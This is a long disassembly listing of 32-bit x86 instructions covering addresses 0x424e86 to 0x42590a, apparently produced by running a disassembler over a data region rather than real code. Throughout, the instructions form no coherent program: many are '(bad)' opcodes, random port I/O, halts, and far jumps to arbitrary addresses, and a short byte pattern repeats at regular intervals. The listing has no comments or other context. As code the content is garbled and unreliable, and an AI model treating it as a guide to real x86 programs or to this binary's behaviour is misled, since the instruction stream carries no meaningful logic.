  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	in     eax,dx
  424e8d:	sub    DWORD PTR [ecx-0x54],edx
  424e90:	into   
  424e91:	and    eax,0x4d975527
  424e96:	das    
  424e97:	push   edx
  424e98:	aas    
  424e99:	cmc    
  424e9a:	xor    al,0x98
  424e9c:	jmp    0x44791f74
  424ea1:	sbb    DWORD PTR [edi-0x753b2825],ecx
  424ea7:	cmp    eax,0xe5c98386
  424eac:	icebp  
  424ead:	push   cs
  424eae:	ins    DWORD PTR es:[edi],dx
  424eaf:	adc    al,0xf3
  424eb1:	jmp    0x8e38b3df
  424eb6:	je     0xbfbd4bbc
  424ebc:	jl     0x424f29
  424ebe:	push   esi
  424ebf:	fist   DWORD PTR [ecx]
  424ec1:	enter  0xdbd1,0xd7
  424ec5:	mov    ch,0xf5
  424ec7:	loop   0x424eae
  424ec9:	adc    dl,BYTE PTR [edi+0x6d]
  424ecc:	or     esp,ecx
  424ece:	ret    
  424ecf:	loope  0x424e96
  424ed1:	lods   al,BYTE PTR ds:[esi]
  424ed2:	add    DWORD PTR [ecx*4+0x49b7229d],edi
  424ed9:	out    0x6f,al
  424edb:	je     0x424ea3
  424edd:	mov    edi,0xd6267961
  424ee2:	pop    ecx
  424ee3:	xchg   edi,eax
  424ee4:	mov    esi,0x8e4c8668
  424ee9:	or     DWORD PTR [eax],edi
  424eeb:	in     al,dx
  424eec:	add    dh,al
  424eee:	sub    ecx,DWORD PTR [esi]
  424ef0:	ins    DWORD PTR es:[edi],dx
  424ef1:	inc    ebx
  424ef2:	popf   
  424ef3:	fwait
  424ef4:	xchg   bl,ch
  424ef6:	jge    0x424e7b
  424ef8:	mov    cl,0xea
  424efa:	das    
  424efb:	(bad)  
  424efc:	jp     0x424f67
  424efe:	xchg   edx,eax
  424eff:	push   ebp
  424f00:	push   ds
  424f01:	dec    esp
  424f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f03:	or     edx,DWORD PTR [esi]
  424f05:	shl    BYTE PTR [edi-0x59190fd6],cl
  424f0b:	ret    0xe224
  424f0e:	xchg   esi,eax
  424f0f:	je     0x424ee8
  424f11:	retf   
  424f12:	sbb    al,0xe8
  424f14:	sahf   
  424f15:	push   esi
  424f16:	rep ins DWORD PTR es:[edi],dx
  424f18:	mov    esp,0xb11fc83a
  424f1d:	mov    al,ds:0x7e97527d
  424f22:	cmp    cl,BYTE PTR [ebx+0x9406633]
  424f28:	mov    esi,0xb58c5d02
  424f2d:	and    ch,BYTE PTR [ebp+0x70]
  424f30:	out    dx,al
  424f31:	out    dx,eax
  424f32:	pop    ebp
  424f33:	sbb    ecx,ebp
  424f35:	stos   DWORD PTR es:[edi],eax
  424f36:	ror    DWORD PTR [edi],0x41
  424f39:	les    edx,FWORD PTR [eax]
  424f3b:	loop   0x424f48
  424f3d:	repz push ebp
  424f3f:	mov    esi,0x39352299
  424f44:	sbb    BYTE PTR [edx-0x46],cl
  424f47:	imul   esp
  424f49:	or     ecx,DWORD PTR [edi-0x1ecc24d4]
  424f4f:	pop    edx
  424f50:	xchg   esp,eax
  424f51:	mov    dh,bh
  424f53:	adc    bl,BYTE PTR [ecx+ecx*8]
  424f56:	jnp    0x424f88
  424f58:	lahf   
  424f59:	adc    al,0xf8
  424f5b:	pop    esi
  424f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f5d:	push   eax
  424f5e:	shr    DWORD PTR [edi+0x568b4cea],cl
  424f64:	out    0x87,al
  424f66:	lea    eax,[edx]
  424f68:	cmc    
  424f69:	cmp    edi,edx
  424f6b:	fld    TBYTE PTR [eax]
  424f6d:	out    dx,al
  424f6e:	hlt    
  424f6f:	int3   
  424f70:	nop
  424f71:	dec    eax
  424f72:	lods   eax,DWORD PTR ds:[esi]
  424f73:	mov    dl,bl
  424f75:	xchg   BYTE PTR [eax-0x7ecd73b4],dh
  424f7b:	inc    esp
  424f7c:	pop    ss
  424f7d:	cmp    DWORD PTR [ecx+0x764c9f72],eax
  424f83:	adc    esi,DWORD PTR [eax+0x3f6d3bda]
  424f89:	outs   dx,DWORD PTR ds:[esi]
  424f8a:	ds push eax
  424f8c:	jl     0x424f25
  424f8e:	push   cs
  424f8f:	in     al,0x0
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	inc    edi
  425001:	xor    BYTE PTR [edx+0x18ab4c6],al
  425007:	add    BYTE PTR [ecx+eax*1],al
  42500a:	add    BYTE PTR [eax],al
  42500c:	loope  0x425087
  42500e:	inc    ecx
  42500f:	ins    BYTE PTR es:[edi],dx
  425010:	int    0x1d
  425012:	in     al,dx
  425013:	mov    edx,0xb70a9ac6
  425018:	js     0x425001
  42501a:	pushf  
  42501b:	or     bh,dh
  42501d:	jo     0x424fd4
  42501f:	test   DWORD PTR [esp+eiz*2],esp
  425022:	sbb    eax,0x132287be
  425027:	dec    ebx
  425028:	test   DWORD PTR [edi-0x1cc3bf],edx
  42502e:	or     eax,0x3e89b9f9
  425033:	or     al,0xb6
  425035:	imul   edi,DWORD PTR [ecx],0xffffffe5
  425038:	mov    eax,ds:0x4af3dd51
  42503d:	mov    esp,0x6066aace
  425042:	jp     0x424fd8
  425044:	xchg   ecx,eax
  425045:	arpl   WORD PTR [edx],cx
  425047:	xor    eax,0xf2d43250
  42504c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42504d:	ins    DWORD PTR es:[edi],dx
  42504e:	(bad)  
  42504f:	push   ecx
  425050:	js     0x42506d
  425052:	dec    ebp
  425053:	jmp    0x425099
  425055:	jl     0x42501c
  425057:	and    eax,0xfc54cb2b
  42505c:	stc    
  42505d:	dec    ecx
  42505e:	sub    ch,BYTE PTR [ebx]
  425060:	xor    eax,0x4aba67bf
  425065:	xchg   ebx,eax
  425066:	cwde   
  425067:	retf   
  425068:	add    eax,0xe0c28fb4
  42506e:	dec    esp
  42506f:	push   es
  425070:	dec    esi
  425071:	adc    dl,bh
  425073:	fmul   QWORD PTR [edi-0x2e]
  425076:	and    al,al
  425078:	fcomp  DWORD PTR [edx]
  42507a:	add    bh,BYTE PTR [ecx+0x24cf4c27]
  425080:	push   eax
  425081:	dec    ebp
  425082:	dec    ebx
  425083:	jo     0x4250cd
  425085:	stc    
  425086:	mov    ds,WORD PTR [ebp+0x69aa61e1]
  42508c:	jb     0x42504c
  42508e:	and    DWORD PTR [ecx],edx
  425090:	popa   
  425091:	push   es
  425092:	jmp    0x1bcf:0xe6b39778
  425099:	shr    DWORD PTR [eax-0x408d494f],cl
  42509f:	call   0x2d14:0x48423b49
  4250a6:	in     al,dx
  4250a7:	iret   
  4250a8:	(bad)  
  4250a9:	outs   dx,BYTE PTR ds:[esi]
  4250aa:	or     bh,0xc2
  4250ad:	retf   0x5147
  4250b0:	out    0x5e,eax
  4250b2:	ins    DWORD PTR es:[edi],dx
  4250b3:	xchg   edi,eax
  4250b4:	(bad)  
  4250b5:	jmp    0x41377a9a
  4250ba:	jae    0x425119
  4250bc:	jl     0x4250ac
  4250be:	pop    edi
  4250bf:	mov    ebp,0xf9460ff6
  4250c4:	xchg   esi,eax
  4250c5:	imul   ebx,DWORD PTR [edi+ebp*2],0x7cb5417
  4250cc:	adc    ebp,DWORD PTR [ebx+0x56]
  4250cf:	xchg   esp,eax
  4250d0:	repz fs push di
  4250d4:	xchg   ecx,eax
  4250d5:	adc    al,0xd1
  4250d7:	mov    esp,0xd5922e32
  4250dc:	add    DWORD PTR [eax+0xd],esi
  4250df:	jg     0x42513a
  4250e1:	xchg   ecx,eax
  4250e2:	scas   eax,DWORD PTR es:[edi]
  4250e3:	call   0xd24add87
  4250e8:	dec    BYTE PTR [edi+0x5c]
  4250eb:	mov    WORD PTR [esi-0x503a78a3],fs
  4250f1:	xor    al,BYTE PTR [esi-0x7d]
  4250f4:	sbb    eax,eax
  4250f6:	sbb    esi,DWORD PTR [esi+0x3d]
  4250f9:	or     bl,BYTE PTR ds:0xfa228734
  4250ff:	arpl   WORD PTR [eax+edx*4-0x8],cx
  425103:	jmp    0x9f7e7e02
  425108:	lods   eax,DWORD PTR ds:[esi]
  425109:	and    edi,DWORD PTR [ebx-0x4d854636]
  42510f:	cmp    eax,0x0
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x42de:0x698d92e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    ah,cl
  42518d:	cmp    dl,bh
  42518f:	jmp    0x14d4d3b5
  425194:	sahf   
  425195:	lea    edx,[ecx+0x6d664483]
  42519b:	jecxz  0x42516d
  42519d:	jl     0x42511f
  42519f:	xor    esp,DWORD PTR cs:0x9eda0bc9
  4251a6:	icebp  
  4251a7:	shl    DWORD PTR [ecx-0x7dee5975],0xc8
  4251ae:	mov    cl,0xe7
  4251b0:	stos   DWORD PTR es:[edi],eax
  4251b1:	mov    cl,0x87
  4251b3:	repz arpl WORD PTR [edx-0x7e],di
  4251b7:	xor    esp,edx
  4251b9:	add    BYTE PTR [edi+0x1adcc9b],dh
  4251bf:	outs   dx,BYTE PTR ds:[esi]
  4251c0:	or     BYTE PTR [edx+ecx*8-0x24],al
  4251c4:	mov    esi,0x4b1d72d7
  4251c9:	jecxz  0x42515a
  4251cb:	jbe    0x42522e
  4251cd:	mov    al,0x39
  4251cf:	stos   BYTE PTR es:[edi],al
  4251d0:	or     dh,cl
  4251d2:	ss test al,al
  4251d5:	sub    eax,0x2052df48
  4251da:	fild   WORD PTR [esi]
  4251dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251dd:	pop    es
  4251de:	std    
  4251df:	cmp    DWORD PTR [eax],esp
  4251e1:	push   esi
  4251e2:	inc    esp
  4251e3:	stc    
  4251e4:	cmp    DWORD PTR ss:[esi-0x37],esp
  4251e8:	fidivr WORD PTR [eax]
  4251ea:	xor    ecx,esp
  4251ec:	(bad)  
  4251ed:	fcmovb st,st(1)
  4251ef:	hlt    
  4251f0:	fdiv   QWORD PTR [ecx+ecx*2+0x51066dc2]
  4251f7:	push   ds
  4251f8:	clc    
  4251f9:	shr    BYTE PTR [ebx-0x2b],1
  4251fc:	mov    ?,ebx
  4251fe:	pop    esi
  4251ff:	sub    eax,0x6a5b421f
  425204:	pop    ebp
  425205:	in     al,dx
  425206:	leave  
  425207:	dec    eax
  425208:	mov    ah,bh
  42520a:	ficom  WORD PTR [edi+0x27]
  42520d:	in     al,0xb8
  42520f:	aad    0xd8
  425211:	jmp    0xb0f4392f
  425216:	int    0xfa
  425218:	out    dx,eax
  425219:	lds    edx,FWORD PTR [edi+0x1d]
  42521c:	dec    ebp
  42521d:	or     BYTE PTR [ecx],bh
  42521f:	test   al,0x11
  425221:	imul   ebx,ebx,0x3f
  425224:	in     al,dx
  425225:	sar    bh,cl
  425227:	mov    al,0xbf
  425229:	mov    ebx,?
  42522b:	add    esi,esi
  42522d:	push   edi
  42522e:	sub    eax,DWORD PTR [ebx+eiz*2-0x4df663cc]
  425235:	push   ss
  425236:	in     al,0xd8
  425238:	push   ebp
  425239:	movaps xmm0,xmm2
  42523c:	xor    bh,ch
  42523e:	pop    ebp
  42523f:	adc    BYTE PTR [edi-0x1e63a795],dh
  425245:	mov    BYTE PTR [eax+0x10bf39c2],0x59
  42524c:	stos   BYTE PTR es:[edi],al
  42524d:	jmp    0x6e8ec606
  425252:	int3   
  425253:	dec    esp
  425254:	mov    esi,0xc3ec9aef
  425259:	push   ebx
  42525a:	xchg   ecx,eax
  42525b:	(bad)  
  42525c:	mov    ds:0x8dd7a685,al
  425261:	(bad)  
  425262:	ins    BYTE PTR es:[edi],dx
  425263:	dec    edx
  425264:	pop    ebp
  425265:	inc    ebp
  425266:	das    
  425267:	call   DWORD PTR [ecx]
  425269:	or     al,0x49
  42526b:	push   es
  42526c:	inc    eax
  42526d:	rcr    DWORD PTR [esi-0x6],1
  425270:	or     bh,bl
  425272:	pop    es
  425273:	cs ret 0x36b6
  425277:	xchg   edi,eax
  425278:	in     al,dx
  425279:	add    ebp,esp
  42527b:	xor    esp,DWORD PTR [ebx]
  42527d:	xchg   BYTE PTR [edx+0x10e8614d],dl
  425283:	(bad)  
  425284:	pop    ss
  425285:	psadbw mm4,QWORD PTR [edi+0x0]
  425289:	retf   
  42528a:	lock sbb bh,BYTE PTR [esi]
  42528d:	js     0x425218
  42528f:	add    BYTE PTR ss:[eax],al
	...
  4252f2:	add    BYTE PTR [eax],al
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	mov    al,BYTE PTR [ebx+0x25]
  425303:	fidivr DWORD PTR [esp+ecx*4+0x1040001]
  42530a:	add    BYTE PTR [eax],al
  42530c:	ror    DWORD PTR [edx-0x7f96ef7f],cl
  425312:	ror    DWORD PTR [esi+eiz*8-0x3],0xa5
  425317:	das    
  425318:	push   ebp
  425319:	xor    esi,eax
  42531b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42531c:	inc    edi
  42531d:	fsubr  QWORD PTR [edx]
  42531f:	into   
  425320:	xor    DWORD PTR [edi+0x3b],ebx
  425323:	sub    dl,BYTE PTR [edx+0x16c93fff]
  425329:	popa   
  42532a:	xchg   ecx,eax
  42532b:	or     eax,0xc9cf1e65
  425330:	fbld   TBYTE PTR [ebp-0x3b2caa66]
  425336:	scas   al,BYTE PTR es:[edi]
  425337:	test   al,0x2a
  425339:	std    
  42533a:	mov    DWORD PTR [edx+0xea546dd],esp
  425340:	mov    edi,0x3e3e3713
  425345:	test   al,0x49
  425347:	mov    dh,0x19
  425349:	loope  0x425319
  42534b:	mov    ds:0x18e63f0f,al
  425350:	fs pop edx
  425352:	shl    BYTE PTR [esi-0x19c999a8],cl
  425358:	sbb    eax,0x78fbd8c9
  42535d:	rcl    DWORD PTR [esi+0x7c9fad9b],1
  425363:	test   al,ah
  425365:	into   
  425366:	jo     0x4252fe
  425368:	out    dx,eax
  425369:	leave  
  42536a:	jl     0x4253bd
  42536c:	(bad)  
  42536d:	pop    edi
  42536e:	test   BYTE PTR [ecx-0x5741ca4],dh
  425374:	setae  BYTE PTR ds:0x6d3f888f
  42537b:	jno    0x425302
  42537d:	mov    ch,0x87
  42537f:	xor    al,0xc0
  425381:	pop    ebp
  425382:	shl    BYTE PTR [eiz*2+0x42b92fb1],1
  425389:	scas   al,BYTE PTR es:[edi]
  42538a:	imul   eax,DWORD PTR [eax-0x2fb2eea4],0x115cb414
  425394:	aam    0xc5
  425396:	outs   dx,BYTE PTR ds:[esi]
  425397:	mov    ch,0xe
  425399:	or     cl,0xdd
  42539c:	add    bh,BYTE PTR [ebp+0x30]
  42539f:	sbb    edi,DWORD PTR [edx+0x18]
  4253a2:	mov    eax,0xe31bd22c
  4253a7:	or     esi,edi
  4253a9:	sahf   
  4253aa:	pop    DWORD PTR es:[ebp+0x27455986]
  4253b1:	pusha  
  4253b2:	(bad)  
  4253b3:	sub    eax,0x431f6619
  4253b8:	sub    al,0xf2
  4253ba:	ja     0x4253b2
  4253bc:	(bad)
  4253bf:	pop    edx
  4253c0:	loope  0x42539d
  4253c2:	push   esi
  4253c3:	mov    BYTE PTR es:[ebp+0x51],dh
  4253c7:	adc    edi,ebp
  4253c9:	in     al,0xde
  4253cb:	mov    esi,0x54b693f1
  4253d0:	xchg   ecx,eax
  4253d1:	mov    ds:0x52423d0e,al
  4253d6:	cmp    edx,DWORD PTR [edi-0x2998942a]
  4253dc:	mov    eax,ds:0x3c0b80ea
  4253e1:	mov    edx,0x6474783
  4253e6:	repz or esi,edi
  4253e9:	in     al,dx
  4253ea:	jne    0x42545e
  4253ec:	retf   0x8f69
  4253ef:	out    dx,al
  4253f0:	inc    esp
  4253f1:	xor    al,0xc1
  4253f3:	jns    0x4253cf
  4253f5:	es repz gs scas al,BYTE PTR es:[edi]
  4253f9:	and    al,BYTE PTR [ebp-0x314d6833]
  4253ff:	xchg   edx,eax
  425400:	jno    0x425426
  425402:	sub    BYTE PTR [esi+0x75],al
  425405:	mov    bh,0xd6
  425407:	lods   eax,DWORD PTR ds:[esi]
  425408:	idiv   ebp
  42540a:	bound  eax,QWORD PTR [ecx+eiz*4]
  42540d:	ret    0xeb91
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esp,eax
  425481:	test   eax,0x8dc00798
  425486:	add    DWORD PTR [eax],eax
  425488:	add    al,0x1
  42548a:	add    BYTE PTR [eax],al
  42548c:	cli    
  42548d:	enter  0x3183,0xa5
  425491:	xor    eax,DWORD PTR [ebx-0x56]
  425494:	mov    esp,0x25f4253d
  425499:	xchg   esp,eax
  42549a:	push   ds
  42549b:	fcmovb st,st(1)
  42549d:	or     BYTE PTR [ebx+0x6c5fe561],0xa5
  4254a4:	push   esp
  4254a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254a6:	out    dx,al
  4254a7:	mov    cl,0xbd
  4254a9:	sbb    edx,DWORD PTR [ebp+eiz*8+0xcd6d5f9]
  4254b0:	cmp    ebx,DWORD PTR [esi-0x43]
  4254b3:	add    DWORD PTR [eax-0x43],esi
  4254b6:	dec    BYTE PTR [edi+0x5e244f2a]
  4254bc:	cmc    
  4254bd:	ds and al,dh
  4254c0:	mov    eax,ds:0x69f0c9d7
  4254c5:	xchg   esp,eax
  4254c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254c7:	cmp    ah,BYTE PTR [esi]
  4254c9:	dec    ecx
  4254ca:	dec    ebp
  4254cb:	sub    ah,BYTE PTR [ecx]
  4254cd:	rol    dh,1
  4254cf:	outs   dx,DWORD PTR ds:[esi]
  4254d0:	xor    eax,0x1bf0df5
  4254d5:	cmp    BYTE PTR [ecx-0x4289d368],dl
  4254db:	xlat   BYTE PTR ds:[ebx]
  4254dc:	out    dx,al
  4254dd:	xor    DWORD PTR [edi],edx
  4254df:	mov    ah,0xb7
  4254e1:	sub    dl,BYTE PTR [edi-0x2]
  4254e4:	jmp    0x98a669e9
  4254e9:	in     eax,0xe
  4254eb:	loop   0x4254d1
  4254ed:	inc    ecx
  4254ee:	lods   al,BYTE PTR ds:[esi]
  4254ef:	cmp    dh,BYTE PTR [ebx+eiz*8-0x76]
  4254f3:	(bad)  [edx]
  4254f5:	pop    esp
  4254f6:	push   esp
  4254f7:	cld    
  4254f8:	dec    esp
  4254f9:	shr    esp,cl
  4254fb:	icebp  
  4254fc:	inc    esp
  4254fd:	mov    dh,0xf7
  4254ff:	jp     0x4254f3
  425501:	jnp    0x42550a
  425503:	pop    ebx
  425504:	fistp  WORD PTR [esp+eax*8]
  425507:	popa   
  425508:	jmp    0x1cf42840
  42550d:	add    bl,BYTE PTR [edx+ebp*2]
  425510:	imul   ecx,DWORD PTR [ebx-0x5fc5c856],0xaa871f84
  42551a:	inc    esi
  42551b:	xchg   ecx,eax
  42551c:	inc    eax
  42551d:	cmp    al,0x16
  42551f:	xchg   edi,eax
  425520:	arpl   bp,dx
  425522:	push   eax
  425523:	add    eax,0x99d80fe7
  425528:	out    0xd4,al
  42552a:	rol    DWORD PTR [ebx+0x5bd6212d],cl
  425530:	xlat   BYTE PTR ds:[ebx]
  425531:	xlat   BYTE PTR ds:[ebx]
  425532:	ror    al,cl
  425534:	mov    dl,0x3a
  425536:	push   edi
  425537:	or     al,0x30
  425539:	(bad)  
  42553a:	imul   esp,DWORD PTR [esi+0x57a3ba9b],0xffffffb2
  425541:	jle    0x42553a
  425543:	add    al,0xf3
  425545:	push   ebp
  425546:	std    
  425547:	(bad)  [esi+0x74]
  42554a:	into   
  42554b:	fcomp  DWORD PTR [ebx+0x6c75abd6]
  425551:	ret    0x9610
  425554:	enter  0x360e,0x76
  425558:	add    eax,0xdcb3e3ec
  42555d:	sti    
  42555e:	aas    
  42555f:	jb     0x42550f
  425561:	or     eax,0x6a91c738
  425566:	inc    edx
  425567:	nop
  425568:	dec    DWORD PTR ss:[edx]
  42556b:	std    
  42556c:	mov    al,ds:0x46e9b0f2
  425571:	sti    
  425572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425573:	repnz fwait
  425575:	and    bh,BYTE PTR [ecx-0x260b96b2]
  42557b:	hlt    
  42557c:	js     0x42558c
  42557e:	adc    eax,0x8b4ac8d8
  425583:	jecxz  0x425559
  425585:	cmp    edx,ebx
  425587:	adc    DWORD PTR [eax*2-0x41182131],ecx
  42558e:	adc    BYTE PTR ds:0x0,bl
	...
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xeb1af13a
  425602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425603:	add    ah,0x8e
  425606:	add    DWORD PTR [eax],eax
  425608:	add    al,0x1
  42560a:	add    BYTE PTR [eax],al
  42560c:	ror    DWORD PTR [eax-0x34ced0a0],cl
  425612:	sahf   
  425613:	(bad)  
  425614:	sub    BYTE PTR ds:0xe02fa5c0,ah
  42561a:	or     cl,dl
  42561c:	lock into 
  42561e:	push   ebp
  42561f:	xchg   ebp,eax
  425620:	in     al,dx
  425621:	leave  
  425622:	outs   dx,BYTE PTR ds:[esi]
  425623:	mov    esp,0xf88ff7c5
  425628:	dec    ebp
  425629:	lods   eax,DWORD PTR ds:[esi]
  42562a:	or     edx,DWORD PTR [edi]
  42562c:	les    edi,FWORD PTR ds:0x19278f1b
  425632:	push   ds
  425633:	pop    esi
  425634:	loop   0x425624
  425636:	adc    DWORD PTR [ebx],ebp
  425638:	mov    WORD PTR [esi-0x1f],ds
  42563b:	mov    al,ds:0x46eaa28
  425640:	rcr    DWORD PTR [edi-0x5cc9b835],cl
  425646:	std    
  425647:	mov    ebx,0x7c3bd3ce
  42564c:	pop    ss
  42564d:	pop    es
  42564e:	dec    esi
  42564f:	mov    edx,0xaa649cf
  425654:	scas   eax,DWORD PTR es:[edi]
  425655:	mov    bl,BYTE PTR [edx-0x23]
  425658:	retf   0x54c8
  42565b:	jns    0x42565e
  42565d:	xor    esi,DWORD PTR [esi+esi*2]
  425660:	sti    
  425661:	sbb    ecx,edi
  425663:	push   0xac11986c
  425668:	sahf   
  425669:	into   
  42566a:	push   0x26eee611
  42566f:	or     al,0x18
  425671:	add    al,0x65
  425673:	push   eax
  425674:	adc    bh,ch
  425676:	test   al,0xb0
  425678:	inc    esi
  425679:	or     DWORD PTR [eax+0x5413fa1e],ebx
  42567f:	outs   dx,DWORD PTR ds:[esi]
  425680:	cld    
  425681:	and    dl,ah
  425683:	js     0x425701
  425685:	jmp    0x8b215b70
  42568a:	push   esp
  42568b:	pop    ecx
  42568c:	mov    bh,0x89
  42568f:	imul   esp,ecx,0x76d79373
  425695:	lds    edx,FWORD PTR [esi+0x1c]
  425698:	sub    ch,cl
  42569a:	scas   al,BYTE PTR es:[edi]
  42569b:	gs scas al,BYTE PTR es:[edi]
  42569d:	cdq    
  42569e:	ret    0x6e24
  4256a1:	sbb    DWORD PTR [ebx],0x30
  4256a4:	call   0xf3e7786c
  4256a9:	mov    ah,0x66
  4256ab:	and    BYTE PTR [edi-0x10],dh
  4256ae:	loope  0x42563d
  4256b0:	jmp    0x42565a
  4256b2:	sbb    eax,0x60df823c
  4256b7:	shl    BYTE PTR [edi-0x779b6479],0x30
  4256be:	lds    ebp,FWORD PTR [ebx]
  4256c0:	push   ebp
  4256c1:	loope  0x4256e2
  4256c3:	push   ebp
  4256c4:	push   ebx
  4256c5:	out    dx,al
  4256c6:	jg     0x4256f8
  4256c8:	mov    ds:0xf42b7142,al
  4256cd:	add    al,0x6b
  4256cf:	in     al,0x4c
  4256d1:	nop
  4256d2:	arpl   WORD PTR [ebp+0xb],di
  4256d5:	cmc    
  4256d6:	cmp    eax,0xb531aab4
  4256db:	add    bl,BYTE PTR [ecx+ebx*4+0x44]
  4256df:	xor    eax,0x5df3128
  4256e4:	test   DWORD PTR [ecx+0x54],ebx
  4256e7:	xchg   edi,eax
  4256e8:	xchg   edx,eax
  4256e9:	call   0x40d9a105
  4256ee:	jb     0x42572c
  4256f0:	test   eax,0xff3072fe
  4256f5:	push   es
  4256f6:	pop    es
  4256f7:	mov    eax,0x2d3a2a55
  4256fc:	repz pop edx
  4256fe:	mov    DWORD PTR [ebx+0x2c],ebp
  425701:	inc    ebp
  425702:	ret    
  425703:	and    al,ch
  425705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425706:	dec    esi
  425707:	ficom  DWORD PTR ds:0x4a0a5973
  42570d:	mov    cl,0x93
  42570f:	pop    edi
	...
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x8024274
  425783:	dec    ecx
  425784:	enter  0x18f,0x0
  425788:	add    al,0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	jl     0x42578e
  42578e:	cmc    
  42578f:	leave  
  425790:	push   0xdea68ee
  425795:	adc    al,0xfc
  425797:	das    
  425798:	xchg   DWORD PTR [eax+0x3574d30],ebp
  42579e:	retf   0xa13
  4257a1:	push   edx
  4257a2:	int3   
  4257a3:	jnp    0x4257fa
  4257a5:	(bad)  
  4257a6:	mov    ah,0x75
  4257a8:	mov    ch,0x1d
  4257aa:	jae    0x42576d
  4257ac:	jb     0x4257ff
  4257ae:	and    esp,ecx
  4257b0:	pop    edi
  4257b1:	(bad)
  4257b6:	pushf  
  4257b7:	fst    QWORD PTR [eax+0x64]
  4257ba:	mov    al,BYTE PTR [ebx-0x7c]
  4257bd:	push   edi
  4257be:	mov    ebx,0x2ee5c8b0
  4257c3:	and    al,0x60
  4257c5:	push   esi
  4257c6:	fcomip st,st(1)
  4257c8:	sbb    eax,0x4c35dbe5
  4257cd:	sbb    dl,BYTE PTR [ebx-0x624b31ca]
  4257d3:	add    bl,BYTE PTR [edx-0x7cdc6faf]
  4257d9:	test   DWORD PTR [ebp+0xd],edi
  4257dc:	fstp   TBYTE PTR [ecx+eiz*4-0x309f0ff]
  4257e3:	lds    esp,FWORD PTR [eax-0x115a310d]
  4257e9:	hlt    
  4257ea:	ja     0x4257ba
  4257ec:	les    eax,FWORD PTR [ecx]
  4257ee:	iret   
  4257ef:	aad    0x7b
  4257f1:	adc    esp,DWORD PTR [esp+ebp*4+0x681d52cb]
  4257f8:	sti    
  4257f9:	mov    DWORD PTR [esi-0x5817150d],eax
  4257ff:	dec    eax
  425800:	mov    ebx,esi
  425802:	mov    eax,0xb8e725c3
  425807:	hlt    
  425808:	out    0x50,al
  42580a:	add    dh,0x68
  42580d:	ret    0x328a
  425810:	pusha  
  425811:	pop    ebp
  425812:	inc    ecx
  425813:	adc    bl,BYTE PTR [edi-0x39]
  425816:	xchg   dh,dl
  425818:	cmp    ebp,DWORD PTR [eax]
  42581a:	fiadd  WORD PTR [edi]
  42581c:	js     0x425841
  42581e:	stos   DWORD PTR es:[edi],eax
  42581f:	les    esi,FWORD PTR [ebx]
  425821:	and    eax,0x38c868e2
  425826:	fxam   
  425828:	in     al,dx
  425829:	adc    al,0x77
  42582b:	lahf   
  42582c:	stos   DWORD PTR es:[edi],eax
  42582d:	push   ds
  42582e:	std    
  42582f:	dec    ecx
  425830:	test   al,0xcc
  425832:	outs   dx,BYTE PTR ds:[esi]
  425833:	in     eax,dx
  425834:	fnstenv [eax+0x9]
  425837:	sbb    esp,DWORD PTR [edi-0x359540b9]
  42583d:	mov    dl,BYTE PTR [ecx]
  42583f:	enter  0x8098,0x65
  425843:	mov    ds:0x65a5e548,eax
  425848:	or     ebp,esi
  42584a:	sahf   
  42584b:	gs jbe 0x4257df
  42584e:	push   esp
  42584f:	push   edx
  425850:	int    0x57
  425852:	sbb    esp,DWORD PTR [eax]
  425854:	mov    eax,ds:0x2e4130a4
  425859:	cld    
  42585a:	mov    eax,DWORD PTR [esi-0x29f2b89d]
  425860:	shr    DWORD PTR [ebp+0x15bdb91d],0xa0
  425867:	mov    dh,BYTE PTR [ebp+edi*4+0x12]
  42586b:	jle    0x4258ca
  42586d:	jmp    0x4258d6
  42586f:	rcr    BYTE PTR [edx+eax*1],1
  425872:	inc    ebp
  425873:	pushf  
  425874:	test   DWORD PTR [edx],eax
  425876:	cmp    eax,0xbc944d5b
  42587b:	dec    ebp
  42587c:	shl    DWORD PTR [esi+0x7a7d470c],1
  425882:	out    0x7e,eax
  425884:	jne    0x425874
  425886:	dec    edx
  425887:	jbe    0x425826
  425889:	mov    ah,0x90
  42588b:	cld    
  42588c:	dec    esp
  42588d:	jmp    0x425890
  42588f:	inc    ebp
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	inc    edi
  425901:	ret    0xe9fd
  425904:	int3   
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
